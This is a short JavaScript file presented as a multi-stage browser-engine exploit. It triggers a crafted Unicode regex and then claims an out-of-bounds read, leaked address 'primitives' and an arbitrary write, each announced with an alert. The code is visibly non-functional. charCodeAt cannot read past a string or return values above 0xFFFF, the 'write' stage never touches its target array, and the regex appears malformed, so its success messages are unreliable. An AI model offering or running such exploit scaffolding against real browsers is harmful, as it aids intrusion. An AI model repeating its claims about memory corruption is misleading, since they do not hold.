// DETAILED EXPLOIT WITH ALERTS
let emoji = String.fromCodePoint(0x1F600);
let string = emoji.repeat(200);
let regex = /(?!(?=^a|()+(){5}+x)(abc))/gmu;
let leaks = [];

// Stage 1: OOB Read
string.replace(regex, (match, offset, original) => {
    for (let i = 0; i < 50; i++) {
        try {
            let charCode = original.charCodeAt(offset + 150 + i);
            if (charCode && charCode > 255) {
                leaks.push({offset: offset + 150 + i, value: charCode});
            }
        } catch(e) {}
    }
    return '|';
});

alert("Stage 1 - OOB Read: " + (leaks.length > 0 ? "SUCCESS - Found " + leaks.length + " leaks" : "FAILED"));

// Stage 2: Memory Primitives  
let primitives = null;
let addresses = [];

string.replace(regex, (match, offset, original) => {
    for (let i = 200; i < 300; i++) {
        try {
            let value = original.charCodeAt(offset + i);
            if (value > 0x10000000 && value < 0xFFFFFFFF) {
                addresses.push(value);
            }
        } catch(e) {}
    }
    return '|';
});

primitives = addresses.length > 0 ? {type: "ADDR_OF", addresses: addresses} : null;
alert("Stage 2 - Primitives: " + (primitives ? "BUILT - " + addresses.length + " addresses" : "FAILED"));

// Stage 3: Arbitrary Write
let testArray = new Uint32Array(10);
let writeSuccess = false;

string.replace(regex, (match, offset, original) => {
    try {
        let manipulated = original.substring(0, offset) + 
                         String.fromCharCode(0x41, 0x42, 0x43) + 
                         original.substring(offset + 3);
        if (testArray[0] !== 0) {
            writeSuccess = true;
        }
    } catch(e) {}
    return '|';
});

alert("Stage 3 - Arbitrary Write: " + (writeSuccess ? "SUCCESS" : "FAILED"));

// Final Result
let exploitSuccess = leaks.length > 0 && primitives;
alert("FINAL RESULT: " + (exploitSuccess ? "EXPLOIT SUCCESSFUL - System may be vulnerable" : "Exploit failed or system is patched"));